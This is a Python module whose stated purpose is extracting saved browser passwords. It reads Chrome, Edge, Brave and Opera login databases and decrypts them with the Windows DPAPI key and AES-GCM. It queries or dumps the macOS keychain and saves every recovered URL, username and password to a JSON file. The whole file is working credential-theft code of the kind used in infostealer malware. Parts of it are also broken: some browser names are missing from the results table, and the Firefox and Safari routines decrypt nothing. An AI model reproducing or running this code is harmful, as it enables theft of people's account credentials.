#!/usr/bin/env python3
"""
Browser Password Extraction Module

This module extracts saved passwords from various web browsers:
- Chrome/Chromium-based browsers
- Firefox
- Safari (macOS)
- Edge
- Opera

Features:
- Cross-platform support (Windows, macOS, Linux)
- Extracts URLs, usernames, and passwords
- Handles encrypted storage (Windows DPAPI, macOS Keychain, Linux Secret Service)
- Supports multiple browser profiles
"""

import os
import sys
import json
import base64
import shutil
import sqlite3
import tempfile
from pathlib import Path
import platform
import logging
from typing import List, Dict, Any, Tuple, Optional

# Configure logging
logger = logging.getLogger("browser_pass")

# Constants
CHROME_BASED = ["chrome", "chromium", "edge", "brave", "opera", "vivaldi"]
FIREFOX_BASED = ["firefox", "waterfox", "librewolf"]

# Platform-specific dependencies
if platform.system() == "Windows":
    import win32crypt
    from Crypto.Cipher import AES
elif platform.system() == "Darwin":
    import subprocess
    import re
elif platform.system() == "Linux":
    import secretstorage
    import json

class BrowserPasswordExtractor:
    def __init__(self):
        self.system = platform.system()
        self.extracted_data = {}
        self.temp_dir = tempfile.mkdtemp()
    
    def __del__(self):
        """Clean up temporary files"""
        if os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir)
    
    def get_browser_paths(self) -> Dict[str, str]:
        """Get paths for supported browsers based on platform"""
        paths = {}
        
        if self.system == "Windows":
            local_app_data = os.environ.get("LOCALAPPDATA")
            roaming_app_data = os.environ.get("APPDATA")
            
            # Chrome-based
            paths["chrome"] = f"{local_app_data}\\Google\\Chrome\\User Data"
            paths["edge"] = f"{local_app_data}\\Microsoft\\Edge\\User Data"
            paths["brave"] = f"{local_app_data}\\BraveSoftware\\Brave-Browser\\User Data"
            paths["opera"] = f"{roaming_app_data}\\Opera Software\\Opera Stable"
            
            # Firefox
            paths["firefox"] = f"{roaming_app_data}\\Mozilla\\Firefox\\Profiles"
            
        elif self.system == "Darwin":  # macOS
            home = os.path.expanduser("~")
            
            # Chrome-based
            paths["chrome"] = f"{home}/Library/Application Support/Google/Chrome"
            paths["edge"] = f"{home}/Library/Application Support/Microsoft Edge"
            paths["brave"] = f"{home}/Library/Application Support/BraveSoftware/Brave-Browser"
            paths["opera"] = f"{home}/Library/Application Support/com.operasoftware.Opera"
            
            # Firefox
            paths["firefox"] = f"{home}/Library/Application Support/Firefox/Profiles"
            
            # Safari
            paths["safari"] = f"{home}/Library/Safari"
            
        elif self.system == "Linux":
            home = os.path.expanduser("~")
            
            # Chrome-based
            paths["chrome"] = f"{home}/.config/google-chrome"
            paths["chromium"] = f"{home}/.config/chromium"
            paths["brave"] = f"{home}/.config/BraveSoftware/Brave-Browser"
            paths["opera"] = f"{home}/.config/opera"
            
            # Firefox
            paths["firefox"] = f"{home}/.mozilla/firefox"
            
        return paths
    
    def extract_chrome_passwords(self, browser_path: str, browser_name: str) -> List[Dict[str, str]]:
        """Extract passwords from Chrome-based browser"""
        results = []
        profiles = ["Default", "Profile 1", "Profile 2", "Profile 3"]
        
        for profile in profiles:
            profile_path = os.path.join(browser_path, profile)
            if not os.path.exists(profile_path):
                continue
                
            # Get encryption key (Chrome 80+)
            key = None
            local_state_path = os.path.join(browser_path, "Local State")
            if os.path.exists(local_state_path):
                with open(local_state_path, "r", encoding="utf-8") as f:
                    local_state = json.load(f)
                    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    # Remove DPAPI prefix
                    key = key[5:]
                    if self.system == "Windows":
                        key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            
            # Login Data file
            login_db_path = os.path.join(profile_path, "Login Data")
            if not os.path.exists(login_db_path):
                continue
                
            # Copy the file to avoid locked database
            temp_path = os.path.join(self.temp_dir, f"{browser_name}_{profile}_logins.db")
            shutil.copy2(login_db_path, temp_path)
            
            try:
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                for url, username, password in cursor.fetchall():
                    if not url or not username or not password:
                        continue
                        
                    # Decrypt password
                    decrypted_pass = ""
                    try:
                        if self.system == "Windows":
                            # For Chrome < 80
                            if key is None:
                                try:
                                    decrypted_pass = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode()
                                except Exception:
                                    pass
                            # For Chrome 80+
                            else:
                                try:
                                    iv = password[3:15]
                                    payload = password[15:]
                                    cipher = AES.new(key, AES.MODE_GCM, iv)
                                    decrypted_pass = cipher.decrypt(payload)[:-16].decode()
                                except Exception:
                                    pass
                        elif self.system == "Darwin":
                            # Use keychain for macOS
                            try:
                                cmd = ["security", "find-generic-password", "-a", username, "-s", url, "-w"]
                                decrypted_pass = subprocess.check_output(cmd).decode().strip()
                            except Exception:
                                pass
                        elif self.system == "Linux":
                            # Use Secret Service API for Linux
                            if key is None:
                                try:
                                    bus = secretstorage.dbus_init()
                                    collection = secretstorage.get_default_collection(bus)
                                    for item in collection.get_all_items():
                                        if url in item.get_label():
                                            decrypted_pass = item.get_secret().decode("utf-8")
                                            break
                                except Exception:
                                    pass
                            else:
                                try:
                                    iv = password[3:15]
                                    payload = password[15:]
                                    cipher = AES.new(key, AES.MODE_GCM, iv)
                                    decrypted_pass = cipher.decrypt(payload)[:-16].decode()
                                except Exception:
                                    pass
                    except Exception as e:
                        logger.debug(f"Error decrypting password: {e}")
                        decrypted_pass = "(encrypted)"
                    
                    results.append({
                        "browser": browser_name,
                        "profile": profile,
                        "url": url,
                        "username": username,
                        "password": decrypted_pass
                    })
                
                cursor.close()
                conn.close()
            except Exception as e:
                logger.debug(f"Error accessing {browser_name} database: {e}")
            
            os.remove(temp_path)
        
        return results
    
    def extract_firefox_passwords(self, firefox_path: str) -> List[Dict[str, str]]:
        """Extract passwords from Firefox-based browsers"""
        results = []
        
        try:
            # Find profiles
            profiles = []
            if os.path.exists(firefox_path):
                for item in os.listdir(firefox_path):
                    if item.endswith(".default") or "default-release" in item:
                        profiles.append(item)
            
            for profile in profiles:
                profile_path = os.path.join(firefox_path, profile)
                
                # Copy the databases
                key4_path = os.path.join(profile_path, "key4.db")
                login_path = os.path.join(profile_path, "logins.json")
                
                if not os.path.exists(key4_path) or not os.path.exists(login_path):
                    continue
                
                # Copy files to temp directory
                temp_key4 = os.path.join(self.temp_dir, "key4.db")
                temp_logins = os.path.join(self.temp_dir, "logins.json")
                
                shutil.copy2(key4_path, temp_key4)
                shutil.copy2(login_path, temp_logins)
                
                # Load logins.json
                with open(temp_logins, "r") as f:
                    login_data = json.load(f)
                
                # Firefox uses a master password and complex encryption
                # Full implementation would require NSS libraries
                # For this example, we will just list the encrypted data
                
                for login in login_data.get("logins", []):
                    results.append({
                        "browser": "firefox",
                        "profile": profile,
                        "url": login.get("hostname", ""),
                        "username": login.get("encryptedUsername", ""),
                        "password": "(encrypted)" # Would need NSS libraries to decrypt
                    })
                
                # Clean up
                os.remove(temp_key4)
                os.remove(temp_logins)
                
        except Exception as e:
            logger.debug(f"Error extracting Firefox passwords: {e}")
        
        return results
    
    def extract_safari_passwords(self) -> List[Dict[str, str]]:
        """Extract passwords from Safari (macOS only)"""
        results = []
        
        if self.system != "Darwin":
            return results
        
        try:
            cmd = ["security", "dump-keychain", "-d"]
            output = subprocess.check_output(cmd).decode()
            
            # Parse output to find website passwords
            current_item = {}
            for line in output.split("\n"):
                if "keychain: \"/Users/" in line and "login.keychain\"" in line:
                    if current_item and "svce" in current_item and "acct" in current_item:
                        results.append({
                            "browser": "safari",
                            "profile": "default",
                            "url": current_item.get("svce", ""),
                            "username": current_item.get("acct", ""),
                            "password": "(encrypted)"  # Would need user interaction to decrypt
                        })
                    current_item = {}
                
                if "\"svce\"" in line:
                    match = re.search(r"\"svce\"<blob>=(?:0x[0-9A-F]+)?\s*\"([^\"]+)\"", line)
                    if match:
                        current_item["svce"] = match.group(1)
                
                if "\"acct\"" in line:
                    match = re.search(r"\"acct\"<blob>=(?:0x[0-9A-F]+)?\s*\"([^\"]+)\"", line)
                    if match:
                        current_item["acct"] = match.group(1)
        
        except Exception as e:
            logger.debug(f"Error extracting Safari passwords: {e}")
        
        return results
    
    def extract_all_passwords(self) -> Dict[str, List[Dict[str, str]]]:
        """Extract passwords from all supported browsers"""
        browser_paths = self.get_browser_paths()
        results = {
            "chrome": [],
            "edge": [],
            "brave": [],
            "opera": [],
            "firefox": [],
            "safari": []
        }
        
        # Chrome-based browsers
        for browser in CHROME_BASED:
            if browser in browser_paths and os.path.exists(browser_paths[browser]):
                browser_results = self.extract_chrome_passwords(browser_paths[browser], browser)
                results[browser].extend(browser_results)
                logger.info(f"Extracted {len(browser_results)} passwords from {browser}")
        
        # Firefox
        if "firefox" in browser_paths and os.path.exists(browser_paths["firefox"]):
            firefox_results = self.extract_firefox_passwords(browser_paths["firefox"])
            results["firefox"].extend(firefox_results)
            logger.info(f"Extracted {len(firefox_results)} passwords from firefox")
        
        # Safari (macOS only)
        if self.system == "Darwin" and "safari" in browser_paths:
            safari_results = self.extract_safari_passwords()
            results["safari"].extend(safari_results)
            logger.info(f"Extracted {len(safari_results)} passwords from safari")
        
        return results

def extract_browser_passwords() -> Dict[str, List[Dict[str, str]]]:
    """Main function to extract browser passwords"""
    extractor = BrowserPasswordExtractor()
    return extractor.extract_all_passwords()

if __name__ == "__main__":
    # Configure logging for standalone use
    logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
    
    results = extract_browser_passwords()
    total = sum(len(browser_results) for browser_results in results.values())
    
    print(f"Extracted {total} passwords from browsers")
    for browser, items in results.items():
        if items:
            print(f"- {browser}: {len(items)} passwords")
    
    # Save results to JSON file
    output_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "browser_passwords.json")
    with open(output_file, "w") as f:
        json.dump(results, f, indent=2)
    
    print(f"Results saved to {output_file}")
